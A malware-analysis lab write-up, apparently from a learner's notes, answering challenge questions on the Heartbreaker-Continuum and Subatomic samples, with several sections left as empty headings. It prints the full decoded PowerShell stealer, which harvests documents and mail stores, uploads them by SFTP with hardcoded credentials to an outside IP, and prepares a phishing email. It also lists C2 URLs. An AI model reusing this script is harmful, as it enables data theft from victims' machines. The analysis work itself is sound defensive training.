---
icon: mosquito-net
---

# Malware Analysis



<table><thead><tr><th data-type="content-ref">Easy</th><th data-type="content-ref">Medium</th><th data-type="content-ref">Hard</th><th data-type="content-ref">Insane</th></tr></thead><tbody><tr><td><a href="malware-analysis.md#heartbreaker-continuum">#heartbreaker-continuum</a></td><td><a href="malware-analysis.md#subatomic">#subatomic</a></td><td></td><td></td></tr><tr><td><a href="malware-analysis.md#opsalwarkameez24-1-super-star">#opsalwarkameez24-1-super-star</a></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table>

## Heartbreaker-Continuum

### T1 - To accurately reference and identify the suspicious binary, please provide its SHA256 hash.

```bash
sha256sum Superstar_MemberCard.tiff.exe
```

Another option - VirusTotal

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### T2 - When was the binary file originally created, according to its metadata (UTC)?

```bash
stat Superstar_MemberCard.tiff.exe

or 

readpe Superstar_MemberCard.tiff.exe
```

Another option - VirusTotal

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### T3 - Examining the code size in a binary file can give indications about its functionality. Could you specify the byte size of the code in this binary?

* code size = **.text sectio**n size

```bash
sudo apt install radare2

rabin2 -S Superstar_MemberCard.tiff.exe
printf "%d\n" 0x1400

OR

readpe Superstar_MemberCard.tiff.exe
```

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Another option - VirusTotal

* Details -> PE info -> Sections -> .text Raw Size

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### T4 - It appears that the binary may have undergone a file conversion process. Could you determine its original filename?

```bash
strings Superstar_MemberCard.tiff.exe
```

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

### T5 - Specify the hexadecimal offset where the obfuscated code of the identified original file begins in the binary.

* we are looking for where $sCrt starts...&#x20;
  * IDA/Ghidra/hexdump/HxD/hexedit solveable...

```bash
hexdump -C Superstar_MemberCard.tiff.exe > output.txt
nano output.txt
```

* $sCrt starts at line 2c70
  * 4 bytes in from the offset 2c70 -> add +4
    * **2c74**

<figure><img src="../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

### T6 - The threat actor concealed the plaintext script within the binary. Can you provide the encoding method used for this obfuscation?

* it asks us how author encoded the $sCrt .text segment...
  * obviously Base64 reverted...because of == at the beginning

<figure><img src="../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>



### T7 - What is the specific cmdlet utilized that was used to initiate file downloads?

* we can check what is inside with CyberChef
  * Obtain the plaintext of offset from 2C74
    * Reverse by character + From Base64

<figure><img src="../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>



* Output:
  * Answer in line 6 => **Invoke-WebRequest**
    * Following the deobfuscation of the Base64 encoded code, the cmdlet Invoke-WebRequest stands out, as it can be used to download files from the web.

```powershell
$hostname = $env:COMPUTERNAME
$currentUser = $env:USERNAME
$url = "http://44.206.187.144:9000/Superstar_MemberCard.tiff"
$img = "C:\users\$currentUser\Downloads\Superstar_MemberCard.tiff"

Invoke-WebRequest -Uri $url -OutFile $img
Start-Process $img

$searchDir = "C:\Users"
$targetDir = "C:\Users\Public\Public Files"

if (-not (Test-Path -Path $targetDir -PathType Container)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}

$currentUser | Out-File -FilePath (Join-Path $targetDir 'username.txt') -Force

nltest /dsgetdc:$env:USERDOMAIN 2>$null | Out-File -FilePath (Join-Path $targetDir 'DCinfo.txt') -Force
Get-WmiObject -Class Win32_UserAccount | Out-File -FilePath (Join-Path $targetDir 'localusers.txt') -Force
wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value 2>$null | Out-File -FilePath (Join-Path $targetDir 'AVinfo.txt') -Force

$currentUserProcesses = Get-WmiObject Win32_Process | Where-Object {
    try {
        $_.GetOwner().User -eq $currentUser
    } catch {
        $false  
    }
}

$currentUserProcesses | Select-Object ProcessName, ProcessId | Out-File -FilePath (Join-Path $targetDir 'UserProcesses.txt') -Force

if (Get-Process -Name Outlook -ErrorAction SilentlyContinue) {
    Stop-Process -Name Outlook -Force -ErrorAction SilentlyContinue
}

$extList =  "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.pdf", "*.csv", ".*oft", "*.potx", 
            "*.xltx", "*.dotx", "*.msg", "*.eml", "*.pst",  "*.odt", "*.ods", "*.odp", "*.odg", "*.ost"
             
$null = Get-ChildItem $searchDir -Recurse -Include $extList -Force -ErrorAction 'SilentlyContinue' |
    ForEach-Object {
        $destinationPath = Join-Path $targetDir $_.Name
        
        if ($_.FullName -ne $destinationPath) {
            Copy-Item -Path $_.FullName -Destination $destinationPath -Force
        }
    }

Get-SmbShare | Out-File -FilePath (Join-Path $targetDir 'Shareinfo.txt') -Force
gpresult /r | Out-File -FilePath (Join-Path $targetDir 'GPinfo.txt') -Force
$ProgressPreference = 'SilentlyContinue'
$archivePath = "$targetDir\$hostname.zip"
Compress-Archive -Path $targetDir -DestinationPath $archivePath -Force 

$wZipUrl = "https://us.softradar.com/static/products/winscp-portable/distr/0/winscp-portable_softradar-com.zip"
$wZipFile = "$targetDir\WinSCP.zip"
$wExtractPath = "C:\Users\Public\HelpDesk-Tools"

Invoke-WebRequest -UserAgent "Wget" -Uri $wZipUrl -OutFile $wZipFile -UseBasicParsing
Expand-Archive -Path $wZipFile -DestinationPath $wExtractPath -Force

$wExePath = "$wExtractPath\WinSCP.com"
$sPath = "$wExtractPath\maintenanceScript.txt"
@"
open sftp://service:M8&C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
put `"$archivePath`"
close
exit
"@ | Out-File -FilePath $sPath -Force
Start-Process -FilePath $wExePath -ArgumentList "/script=`"$sPath`"" -Wait -NoNewWindow


$outlookPath  = Get-ChildItem -Path "C:\Program Files\Microsoft Office" -Filter "OUTLOOK.EXE" -Recurse | Select-Object -First 1 -ExpandProperty FullName

$htmlBody = @"
<!DOCTYPE html>
<html>
<head>
<style>
    body {
    font-family: Calibri, sans-serif;
    }
</style>
</head>
<body>
<p>Hey, </p> <p> Hope you're doing great when you see this. I'm reaching out because there's something I've been wanting to share with you. You know that feeling when you've been admiring someone from afar, but hesitated to take the next step? That's been me lately, but I've decided it's time to change that.</p>
<p>In a world where we often rush through everything, I believe in the beauty of taking things slow, cherishing each moment like a scene from a timeless tale. So, if you're open to it, I'd love for us to meet up after hours.</p>
<p>I've arranged for a rendezvous at a private membership club, where we can enjoy a bit of privacy and exclusivity. I've attached the map for your convenience. </p>
<p>To gain entry, you'll need a digital membership card for entry, accessible <a href='http://44.206.187.144:9000/Superstar_MemberCard.tiff.exe'>here</a>. Just a friendly heads up, there's a time limit before you can download it, so it's best to grab it sooner rather than waiting too long.</p>
<p√õ√ù[¬ù[¬ô√àH\¬ôH]\¬ã¬è√ú
```

### T8 - Could you identify any possible network-related Indicators of Compromise (IoCs) after examining the code? Separate IPs by comma and in ascending order.

```powershell
$url = "http://44.206.187.144:9000/Superstar_MemberCard.tiff"
open sftp://service:M8&C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
```

* answer: **35.169.66.138,44.206.187.144**

### T9 - The binary created a staging directory. Can you specify the location of this directory where the harvested files are stored?

```powershell
$targetDir = "C:\Users\Public\Public Files"
```

* answer: **C:\Users\Public\Public Files**

### T10 - What MITRE ID corresponds to the technique used by the malicious binary to autonomously gather data?

* use google...
* answer: **T1119**

<figure><img src="../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

### T11 - What is the password utilized to exfiltrate the collected files through the file transfer program within the binary?

```powershell
open sftp://service:M8&C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
```

* answer: **M8\&C!i6KkmGL1-#**
* **PWNED <3**



## OpSalwarKameez24-1: Super-Star

### T1 - What is the process name of malicious NodeJS application?







## Subatomic

### T1 - What is the Imphash of this malware installer?

VirusTotal -> Details -> Basic properties

* answer: **b34f154ec913d2d2c435cbd644e91687**

<figure><img src="../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>



### T2 - The malware contains a digital signature. What is the program name specified in the SpcSpOpusInfo Data Structure?

VirusTotal -> Details -> Signature info

* answer: **Windows Update Assistant**

<figure><img src="../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

### T3 - The malware uses a unique GUID during installation, what is this GUID?

* steps: open .exe in 7zip manager -> 2 folders + \[NSIS].msi
  * seen only in FlareVM, basic OS shows only 2 folders without NSIS file...
* NSIS.msi file
  * line 1817 -> GUID version
    * answer: **cfbc383d-9aa0-5771-9485-7b806e8442d5**

<figure><img src="../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

### T4 - The malware contains a package.json file with metadata associated with it. What is the 'License' tied to this malware?

<figure><img src="../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

* In the $PLUGINSDIR directory, I found another archive, app-32.7z
  * After extracting it, I started searching for the package.json file. The package.json file is used by the npm package manager, which suggested to me that I was looking for something related to JavaScript. Typically, JavaScript-related files are placed in separate directories, such as resources or static. In this case, I found a resources directory in the archive

<figure><img src="../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

* It contained two files: elevate.exe and app.asar. After searching Google, I found that files with the .asar extension are another archive format that works similarly to tar (link). Using the command npm install --engine-strict @electron/asar, available in the Readme.md file of this package, I installed the asar software. Then, using the command asar e app.asar ./resources/, I extracted all the files from the archive

<figure><img src="../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

* After opening the package.json file, I got the answer

<figure><img src="../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

* answer: **ISC**

### T5 - The malware connects back to a C2 address during execution. What is the domain used for C2?

* VirusTotal -> Relations -> Contacted Domains
* answer: **illitmagnetic.site**

<figure><img src="../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

### T6 - The malware attempts to get the public IP address of an infected system. What is the full URL used to retrieve this information?

* Look further into the app.js file we dropped out of the asar file‚Ä¶ I will begin looking into it. It is heavily obfuscated

<figure><img src="../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

* Since it is connecting back to a domain I searched for ‚Äúhttps:‚Äù and got a hit and that was the answer. My thought behind this since I know addresses typically start with HTTP or HTTPS I presumed that it was going to be one of those...

<figure><img src="../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

* Answer: **https://ipinfo.io/json**

### T7 - The malware is looking for a particular path to connect back on. What is the full URL used for C2 of this malware?



* We found the domain earlier...
* After obtaining the deobfuscated content of the app.js script, the answer to this question I found in line 14
* answer: **https://illitmagnetic.site/api/**

<figure><img src="../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>

### T8 - The malware has a configured user\_id which is sent to the C2 in the headers or body on every request. What is the key or variable name sent which contains the user\_id value?

* After obtaining the deobfuscated content of the app.js script, the answer to this question I found in line 45
  * In the file searching for user\_id I found the variable being duvet\_user
* answer: **duvet\_user**

<figure><img src="../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

### T9 - The malware checks for a number of hostnames upon execution, and if any are found it will terminate. What hostname is it looking for that begins with arch?

* Using the file search function, I found only one instance of the word arch
* answer: **archibaldpc**

<figure><img src="../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

### T10 - The malware looks for a number of processes when checking if it is running in a VM; however, the malware author has mistakenly made it check for the same process twice. What is the name of this process?

* Searching for ‚Äòtask‚Äô‚Ä¶ I found an array of running tasks it looks for. The one it looks for twice if vmwaretray
* The checkVM function retrieves a list of processes using the tasklist command and then checks if any from the following list appear on that list. Upon closer inspection, I noticed that the repeated value is vmwaretray
* answer: **vmwaretray**

<figure><img src="../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

### T11 - The malware has a special function which checks to see if C:\Windows\system32\cmd.exe exists. If it doesn't it will write a file from the C2 server to an unusual location on disk using the environment variable USERPROFILE. What is the location it will be written to?



### T12 - The malware appears to be targeting browsers as much as Discord. What command is run to locate Firefox cookies on the system?



### T13 - To finally eradicate the malware, Forela needs you to find out what Discord module has been modified by the malware so they can clean it up. What is the Discord module infected by this malware, and what's the name of the infected file?



## Safecracker

We recently hired some contractors to continue the development of our Backup services hosted on a Windows server. We have provided the contractors with accounts for our domain. When our system administrator recently logged on, we found some pretty critical files encrypted and a note left by the attackers. We suspect we have been ransomwared. We want to understand how this attack happened via a full in-depth analysis of any malicious files out of our standard triage. A word of warning, our tooling didn't pick up any of the actions carried out - this could be advanced. Warning This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments. One the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed.

### T1 -&#x20;

### T2 -&#x20;

### T3 -&#x20;

### T4 -&#x20;

### T5 -&#x20;

### T6 -&#x20;

### T7 -&#x20;

### T8 -&#x20;

### T9 -&#x20;

### T10 -&#x20;

### T11 -&#x20;

### T12 -&#x20;

### T13 -&#x20;

### T14 -&#x20;

### T15 -&#x20;

### T16 -&#x20;

### T17 -&#x20;

### T18 -&#x20;

### T19 -&#x20;

### T20 -&#x20;

### T21 -&#x20;

### T22 -&#x20;
